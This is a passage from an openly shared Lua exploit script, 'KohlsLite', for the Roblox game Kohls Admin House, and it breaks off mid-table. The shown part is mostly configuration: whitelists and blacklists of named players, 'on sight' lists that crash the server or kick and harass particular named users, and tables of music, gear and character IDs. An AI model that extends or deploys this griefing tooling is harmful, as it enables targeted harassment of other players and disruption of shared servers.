--[[
_  _____  _   _ _     ____  _     ___ _____ _____ 
| |/ / _ \| | | | |   / ___|| |   |_ _|_   _| ____|
| ' / | | | |_| | |   \___ \| |    | |  | | |  _|  
| . \ |_| |  _  | |___ ___) | |___ | |  | | | |___ 
|_|\_\___/|_| |_|_____|____/|_____|___| |_| |_____| v1.418 ]]

-- This free, open-source script is for the Roblox game Kohls Admin House (KAH)
-- Created by ScriptingProgrammer (Roblox) / TS2021 (Discord) / S-PScripts (GitHub)

-- Support this script today by donating Robux to me!
-- Please do not "skid" off this code by changing the name and removing the dev section. It makes me annoyed!
-- You can make your own script instead of skidding and you can take stuff from here if necessary.

local function Remind(msg)
        game.StarterGui:SetCore("SendNotification", {
                Title = "KohlsLite",
                Text = msg,
                Duration = 1
        })
end;

if getgenv().kohlsexecuted then 
        return 
        Remind("You've already executed KohlsLite!") 
end

getgenv().kohlsexecuted = true -- don't touch!

getgenv().deprefix = "." -- This can be of any length

getgenv().klversion = "1.418" -- The version of KohlsLite, of course.

local function Chat(msg)
      game.Players:Chat(msg)
end

local function Speak(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

if getgenv().theprefix then
	prefix = getgenv().theprefix
else
	prefix = getgenv().deprefix
end

local defaults = {".antirocket me", ".tnok", ".antimsg me"} -- you don't need to change these

local bending -- ignore
local eincrash -- ignore
local starttime = os.clock() -- ignore

-- Start up scripts
local function startupScripts()
           if not getgenv().autoruncmds then
                for i = 1, #defaults do
                        Chat(defaults[i]) 
                end
        else
            for i = 1, #getgenv().autoruncmds do
                        Chat(getgenv().autoruncmds[i])
            end
        end
end

-- Serverlocked users
local blacklist = {
    "SlenderMan990921",
    "e5usp",
    "Asphetto",
    "91txt",
    "LeanConsumer69",
    "Fixydrqma",
    "Robloxian577226532",
    "jjthejoker7",
    "cihanahmet1670",
    "Fu14r",
    "bbgurrrrl",
    "He4rt_4"
}

-- Users not affected by serverlock
local whitelist = {}

-- Perm Whitelist
local pwl = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "dawninja21",
    "Dawninja21alt",
    "Di33le2",
    "darkmadeboy",
    "Dekryptionite",
    "3cxos",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "Ih0temyIife",
    "D_ionte",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "Me_ChurchOfSat4n",
    "Milderous",
    "Anka_707587",
    "DionteIsCute",
    "me_capybara",
    "E4_DQ"
}

-- Players you cannot kick
local nokick = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "Di33le2",
    "Dekryptionite",
    "3cxos",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "dawninja21",
    "Dawninja21alt",
    "GAMMINGBUDD_REAL",
    "Artyuiiiiti",
    "D_ionte",
    "EternitHD",
    "Milderous",
    "Anka_707587",
    "DionteIsCute",
    "me_capybara"
}

-- Players with special perms
local specialperms = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "3cxos",
    "t_echl",
    "D_ionte",
    "EternitHD",
    "Milderous",
    "DionteIsCute"
}

-- New users get blacklisted (prevent crashers)
local newplrslocked = {} -- don't edit!!
local newplrautoslock = true -- if new players under 21 days join they get blacklisted
local newlen = 21 -- control what is considered as a new account

-- Users that can use blacklisted gears (or gears when antigear is on)
local GWhitelisted = {}

-- Perm Gear Whitelist
local pgwl = {
    "me_123eq",
    "me_crashking",
    "ScriptingProgrammer",
    "t_echr",
    "BANNter_Original",
    "witnessfox22",
    "IceStuds",
    "atprog",
    "dawninja21",
    "Dawninja21alt",
    "Di33le2",
    "darkmadeboy",
    "Dekryptionite",
    "3cxos",
    "hudhejeir",
    "BIGpe7niss7",
    "clydekash",
    "t_echl",
    "Ih0temyIife",
    "SZCVAK",
    "TheRealestOnHere",
    "Altsarecooleh",
    "idonthacklol101ns",
    "Me_ChurchOfSat4n",
    "Milderous",
    "Anka_707587",
    "D_ionte",
    "DionteIsCute"
}

-- Serverlock
local slockenabled = false

-- Other stuff
local loopkill = {}
local byecam = {}
local carcar = {}

antikill = {}

-- Gamepass saving
permusers = {} -- users that use perm will be placed here
personsusers = {} -- users that use persons will be placed here

-- Auto stuff relating to users
rkick_on_sight = {} -- rocket kick player when they join ONLY WORKS WITH ONE PLAYER
crash_on_sight = {"aliihsan12345Bloxy"} -- crash server when player joins
mkick_on_sight = {"He4rt_4","hellokitty2kute"} -- kick player with pm spam when they join ONLY WORKS WITH ONE PLAYER
suser_on_sight = {} -- slow a user when they join with car gear ONLY WORKS WITH ONE PLAYER
furry_on_sight = {"jhjssikeksms"} -- nine jay n

-- Variables for moving
local movestatus = false
Kohls = workspace.Terrain:WaitForChild("_Game")
Admin = Kohls:WaitForChild("Admin")
Pads = Admin:WaitForChild("Pads"):GetChildren()

local musicplay

-- Thanks to Dizzy for this idea of writing my musiclist (also I used ChatGPT to update it so cry!)
-- All the music ids I've saved
local musictable = {
    ["1"] = { id = "9048375035", name = "All dropping 8 beats" },
    ["2"] = { id = "6680495507", name = "Robbery" },
    ["3"] = { id = "6529070845", name = "Brace Yourself" },
    ["4"] = { id = "6917155909", name = "They trying to be cray" },
    ["5"] = { id = "6913550990", name = "TLT FNAF 2" },
    ["6"] = { id = "6847929757", name = "LONER" },
    ["7"] = { id = "1839029458", name = "Exotico Speedo" },
    ["8"] = { id = "35930009", name = "Monster Mash" },
    ["9"] = { id = "6772846771", name = "TOT!" },
    ["10"] = { id = "11808880515", name = "women song" },
    ["11"] = { id = "6681840651", name = "What?!" },
    ["12"] = { id = "1841647093", name = "Life in an Elevator" },
    ["13"] = { id = "1837070127", name = "Prima Bossa" },
    ["14"] = { id = "6806140478", name = "Night Lights" },
    ["15"] = { id = "6703926669", name = "Freaks" },
    ["16"] = { id = "2042581436", name = "annoying citizen" },
    ["17"] = { id = "6872126938", name = "Young vacations" },
    ["18"] = { id = "6695430066", name = "nuts" },
    ["19"] = { id = "5216738441", name = "big obama the real g" },
    ["20"] = { id = "9038620433", name = "Out Of My Head" },
    ["21"] = { id = "6819593773", name = "ISVVC - Project Junt" },
    ["22"] = { id = "8147012902", name = "gigachad loop" },
    ["23"] = { id = "6893776529", name = "Plasdu & 1006x3 - Kroxxxxroadxx" },
    ["24"] = { id = "6788646778", name = "Hella Sketches" },
    ["25"] = { id = "9124780123", name = "Miss the rage Loop (Sparo Loop)" },
    ["26"] = { id = "6897686359", name = "fizz" },
    ["27"] = { id = "142376088", name = "Raining Tacos" },
    ["28"] = { id = "1846368080", name = "Stadium Rave (A)" },
    ["29"] = { id = "1840511219", name = "Funky Fanfare" },
    ["30"] = { id = "1839404854", name = "Rock In" },
    ["31"] = { id = "6674211522", name = "Loud music fail" },
    ["32"] = { id = "6984999899", name = "AAAAAAAAAAAAAAAAAAAAA" },
    ["33"] = { id = "1838097718", name = "Royal Dedication" },
    ["34"] = { id = "9038845849", name = "dubstep" },
    ["35"] = { id = "1843622301", name = "Mumbai Moon" },
    ["36"] = { id = "14145620056", name = "The Final Phonk" },
    ["37"] = { id = "13530437708", name = "Phonk Vol 2 - The Final Phonk" },
    ["38"] = { id = "14145627857", name = "Catch My Drift" },
    ["39"] = { id = "14145624031", name = "Phonk Vol. 1" },
    ["40"] = { id = "13530438299", name = "stop posting about baller" },
    ["41"] = { id = "6845637094", name = "Legends Juice" },
    ["42"] = { id = "6770303644", name = "Minecraft Chest" },
    ["43"] = { id = "6783714255", name = "Brooklyn blood bop" },
    ["44"] = { id = "1838028467", name = "VIP Me" },
    ["45"] = { id = "1848354536", name = "James Clarke - Relaxed Scene" }, -- chill back (alt name before i found the actual original music)
    ["46"] = { id = "45819151", name = "sad depressing music 4am" },
    ["47"] = { id = "6828176320", name = "Painted black" },
    ["48"] = { id = "5410084188", name = "WRLD - Hang Up" },
    ["49"] = { id = "6911766512", name = "Cyber Chainsaw" },
    ["50"] = { id = "7612400047", name = "Unknown" },
    ["51"] = { id = "16190783444", name = "Dubidubidu (Techno Remix)" }, -- chipi chipi chapa chapa (alt name before i found clipply)
    ["52"] = { id = "16190782786", name = "Lil Kuudere X sukoyomi" },
    ["53"] = { id = "6844230235", name = "WHAT THE HELL" },
    ["54"] = { id = "15689451063", name = "Interworld - Metamorphosis" },
    ["55"] = { id = "15689455422", name = "kirkiimad - i love (slow+reverb version)" },
    ["56"] = { id = "6937042327", name = "Stunning" },
    ["57"] = { id = "1841668624", name = "Have a Lazy Day a" },
    ["58"] = { id = "1848350335", name = "Desert Sands" },
    ["59"] = { id = "6805032026", name = "KILL BILL (Fast)" },
    ["60"] = { id = "1837853076", name = "SEE YOU IN HELL!" },
    ["61"] = { id = "5410085763", name = "TOKYO MACHINE - PLAY!"},
    ["62"] = { id = "7014573768", name = "pew sfx"},
    ["63"] = { id = "1838635121", name = "Sad End"},
    ["64"] = { id = "6841685130", name = "ButtonPress_53"},
    ["65"] = { id = "1839817591", name = "Animation Opening"},
    ["66"] = { id = "1837879082", name = "Paradise Falls"},
    ["67"] = { id = "1837392641", name = "Cannibal Collection"},
    ["68"] = { id = "6901063458", name = "Rihanna - SOS"},
    ["69"] = { id = "16662831858", name = "WahRA - Idk Remix"},
    ["70"] = { id = "7764369437", name = "BEEP"},
    ["71"] = { id = "1845458027", name = "Smooth Nylons"},
    ["72"] = { id = "9047105533", name = "No Smoking"},
    ["73"] = { id = "1846808350", name = "Get Up And Boogie"},
    ["74"] = { id = "14366981962", name = "Diss na Hagi Łagi"},
    ["75"] = { id = "11265157079", name = "Advance Slayer"},
    ["76"] = { id = "11265140685", name = "Untitled"},
    ["77"] = { id = "11265166921", name = "Pierniki"},
    ["78"] = { id = "11265137944", name = "Slayers Hatred"},
    ["79"] = { id = "11265148479", name = "Amogus"},
    ["80"] = { id = "11265145737", name = "Blaze You"},
    ["81"] = { id = "11265173310", name = "Biszkopty"},
    ["82"] = { id = "11265164947", name = "Chipsy"},
    ["83"] = { id = "11496561844", name = "Fresh New Age"},
    ["84"] = { id = "14884822656", name = "CyPhrix - StartUpSequence.cprx"},
    ["85"] = { id = "14884819670", name = "CyPhrix - Wobble"},
    ["86"] = { id = "14884823796", name = "XRAY"},
    ["87"] = { id = "14884823178", name = "Three Dimensions"},
    ["88"] = { id = "14884817162", name = "Angel Hour"},
    ["89"] = { id = "14884823527", name = "Outcome"},
    ["90"] = { id = "14366982317", name = "GTA"},
    ["91"] = { id = "15689442195", name = "CEO"},
    ["92"] = { id = "15689441772", name = "HELLFIRE" },
    ["93"] = { id = "15689451512", name = "Nothing Bad Is Going to Happen" },
    ["94"] = { id = "15689446882", name = "EXISTANCE"},
    ["95"] = { id = "16190782511", name = "uzipack"},
    ["96"] = { id = "9043887091", name = "Lo-fi Chill A"},
    ["97"] = { id = "1837768517", name = "Bossa Me (a)"},
    ["98"] = { id = "9039445224", name = "8 Bitty Kitty - Underscore"},
    ["99"] = { id = "9046863579", name = "City Lights - Roblox"},
    ["100"] = { id = "15689457918", name = "nMisaki - Dream Girl (sped up)"},
    ["101"] = { id = "1845742414", name = "Appetizer"},
    ["102"] = { id = "6889574376", name = "Rascal!"},
    ["103"] = { id = "7029024726", name = "Throttle - Bloom"},
    ["104"] = { id = "1840612595", name = "A New Renaissance"},  
    ["105"] = { id = "1836054144", name = "Upbeat Dude"},
    ["106"] = { id = "1837275138", name = "Never Enough"},
    ["107"] = { id = "1839917800", name = "Unknown"},
    ["108"] = { id = "1840221593", name = "Fit For Life (A)"},
    ["109"] = { id = "9041863801", name = "Unknown"},
    ["110"] = { id = "1836711447", name = "Just Like Me"},
    ["111"] = { id = "1845070869", name = "Eye Open"},
    ["112"] = { id = "1847863129", name = "Tech Synth A"},
    ["113"] = { id = "1845073388", name = "Need For Speed"},
    ["114"] = { id = "1845092143", name = "Super Nova"}
}

local gearlist = {
    ["boombox"] = { gearid = "212641536" },
    ["vg"] = { gearid = "94794847" },
    ["osas"] = { gearid = "92628079" },
    ["gb"] = { gearid = "82357101" },
    ["bhbomb"] = { gearid = "28277486" },
    ["tictac"] = { gearid = "16924676" },
    ["pgun"] = { gearid = "34870758" },
    ["camfixer"] = { gearid = "79736563" },
    ["painter"] = { gearid = "18474459" },
    ["telemon"] = { gearid = "93136746" },
    ["trapmine"] = { gearid = "11999247" },
    ["timegears"] = { gearid = "77443461" },
    ["admslayer"] = { gearid = { "268586231", "1103011681"} },
    ["kp"] = { gearid = {"583030187, 68539623"} },
    ["icebreaker"] = { gearid = {"87361662", "66896601"} },
    ["periastrons"] = { gearid = {"108158379", "80661504", "233520257", "73829193", "69499437", "139577901", "2544549379", "120307951", "99119240", "93136802", "80597060", "159229806", "77443461"} },
    ["melees"] = { gearid = {"121946387", "12187348", "170897263", "427947884", "306971294", "306971294", "11999235", "28275809", "10758456", "243790334", "14719505", "13207169", "11956382", "10469910", "124472052", "20721924"} },
    ["guns"] = { gearid = {"243007180", "116693764", "212296936", "168143042", "467138029", "42845609", "130113146", "26017478", "26014536", "9360722592", "18268645"} },
    ["fungears"] = { gearid = {"111876831", "90718686", "283755431", "139578061", "90718686", "212641536", "392057539", "323477973", "78730532", "47597835", "212641536", "88143093", "73265108", "115377964", "98411393" } },
    ["explosives"] = { gearid = {"88885539", "88885524", "73888479", "110337853", "101110605", "29957963", "503955938", "243788010", "88146497"} },
    ["destructives"] = { gearid = {"125013830", "225921650", "60357972", "108158379"} },
    ["swords"] = { gearid = {"25740034", "638089422", "170903610", "319655422", "125013769", "108158379", "2470750640", "2041982658", "361950297", "2103274863", "181356054", "163491866", "108158439"} },
    ["rideables"] = { gearid = {"304719869", "2568114215", "158069143", "185422295", "346687565", "553939167", "820013867", "387285940", "163348575", "206799274", "928805891", "124127383", "125013849", "2445089071", "253519495"} }
}

local turnlist = {
    ["furry"] = {name = {"char [args2] 18", "paint [args2] Institutional white", "hat [args2] 10563319994", "hat [args2] 12578728695", "shirt [args2] 10571467676", "pants [args2] 10571468508"}},
    ["female"] = {name = {"char [args2] 31342830", "removehats [args2]", "paint [args2] Institutional white", "hat [args2] 7141674388", "hat [args2] 7033871971", "shirt [args2] 5933990311", "pants [args2] 7219538593"}}
}

local function replaceArgs2(name, args2)
    return string.gsub(name, "%[args2%]", args2)
end

-- Saved chars
local charlist = {
    ["furry"] = { charid = "4844006008" }, -- 1
    ["sierr"] = { charid = "1267527674" }, -- 2
    ["telac"] = { charid = "13645" },           -- 3
    ["epicszs"] = { charid = "548456077" },  -- 4
    ["temi"] = { charid = "45024180" },   -- 5
    ["atprog"] = { charid = "1389780396" }, -- 6
    ["menaal"] = { charid = "1793973864" }, -- 7
    ["agspureiam"] = { charid = "36377783" },   -- 8
    ["tech"] = { charid = "1702851506" }, -- 9
    ["aria"] = { charid = "2781438808" }, -- 10
    ["mel"] = { charid = "619659263" }, -- 11
    ["noob"] = { charid = "18" } -- 12
}

-- Parts
local ogcframes = {
                ["SmoothBlockModel178"] = {-13.0650005, 45.4300003, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel176"] = {-15.0650005, 37.6300011, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel140"] = {-13.0650005, 37.0300026, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel137"] = {-19.0650005, 31.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel135"] = {-11.0650005, 36.4300003, 57.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel131"] = {-15.0650005, 37.6300011, 57.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel129"] = {-17.0650005, 38.2300034, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel124"] = {-30.0650005, 38.2300034, 48.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel123"] = {-9.06500053, 25.0300007, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel118"] = {-11.0650005, 36.4300003, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel117"] = {-3.06500006, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel116"] = {-3.06500006, 13.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel128"] = {-21.0650005, 32.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel110"] = {-25.0650005, 34.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel105"] = {-57.0650024, 13.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel125"] = {-17.0650005, 29.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel104"] = {-7.06500053, 23.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel119"] = {-30.0650005, 37.0300026, 54.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel100"] = {-5.06500006, 22.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel97"] = {-41.0650024, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel89"] = {-3.06500006, 15.4300003, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel88"] = {-13.0650005, 27.4300022, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel147"] = {-57.0650024, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel160"] = {-15.0650005, 45.4300003, 51.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel84"] = {-35.0650024, 34.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel81"] = {-3.06500006, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel80"] = {-57.0650024, 21.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel111"] = {-37.0650024, 33.4300003, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel87"] = {-15.0650005, 28.6300011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel78"] = {-41.0650024, 31.0300007, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel77"] = {-39.0650024, 32.2300034, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel165"] = {-11.0650005, 45.4300003, 53.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel76"] = {-35.0650024, 34.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel75"] = {-30.0650005, 28.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel106"] = {-57.0650024, 15.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel74"] = {-39.0650024, 32.2300034, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel69"] = {-3.06500006, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel67"] = {-16.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel98"] = {-30.0650005, 26.2300014, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel66"] = {-57.5650024, 7.03000021, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel65"] = {-3.06500006, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel63"] = {-33.0650024, 35.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel62"] = {-33.0650024, 35.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel68"] = {-30.0650005, 31.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel109"] = {-30.0650005, 37.0300026, 66.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel162"] = {-17.0650005, 45.4300003, 55.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel61"] = {-35.0650024, 34.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel58"] = {-43.0650024, 29.8300018, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel57"] = {-3.06500006, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel55"] = {-55.0650024, 22.6300011, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel108"] = {-3.06500006, 15.4300003, 72.3430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel48"] = {-57.0650024, 11.2300005, 50.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel102"] = {-3.06500006, 21.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel46"] = {-38.5650024, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel44"] = {-51.0650024, 25.0300007, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel43"] = {-22.5650005, 10.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel41"] = {-30.0650005, 21.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel39"] = {-57.0650024, 13.6300011, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel82"] = {-57.0650024, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel127"] = {-23.0650005, 33.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel95"] = {-27.0650005, 35.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel114"] = {-30.0650005, 34.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel37"] = {-30.0650005, 23.8300018, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel36"] = {-30.0650005, 33.4300003, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel130"] = {-13.0650005, 37.0300026, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel56"] = {-30.0650005, 29.8300018, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel53"] = {-19.0650005, 7.03000021, 44.7430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel35"] = {-57.0650024, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel34"] = {-45.0650024, 28.6300011, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel32"] = {-43.0650024, 29.8300018, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel54"] = {-39.0650024, 32.2300034, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel120"] = {-30.0650005, 38.2300034, 60.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel49"] = {-57.0650024, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel29"] = {-30.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel27"] = {-41.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel26"] = {-30.0650005, 32.2300034, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel51"] = {-30.0650005, 27.4300022, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel21"] = {-47.0650024, 27.4300022, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel17"] = {-49.0650024, 26.2300014, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel83"] = {-19.0650005, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel16"] = {-47.0650024, 27.4300022, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel50"] = {-21.5650005, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel115"] = {-3.06500006, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel15"] = {-50.5650024, 11.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel14"] = {-30.0650005, 9.43000031, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel13"] = {-44.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel42"] = {-41.0650024, 31.0300007, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel12"] = {-53.0650024, 23.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel64"] = {-57.0650024, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel11"] = {-50.5650024, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel28"] = {-49.0650024, 26.2300014, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel113"] = {-3.06500006, 11.2300005, 51.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel10"] = {-44.5650024, 8.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel7"] = {-43.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel6"] = {-57.0650024, 21.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel99"] = {-2.56500006, 7.03000021, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel143"] = {-30.0650005, 37.0300026, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel3"] = {-41.0650024, 4.63000011, 44.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel122"] = {-3.06500006, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel9"] = {-41.0650024, 2.83000016, 42.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel19"] = {-51.0650024, 25.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel8"] = {-44.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel45"] = {-15.5650005, 10.0300007, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel72"] = {-15.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel18"] = {-51.0650024, 25.0300007, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel103"] = {-30.0650005, 25.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel33"] = {-55.0650024, 22.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel31"] = {-30.0650005, 18.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel71"] = {-3.06500006, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel30"] = {-30.0650005, 22.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
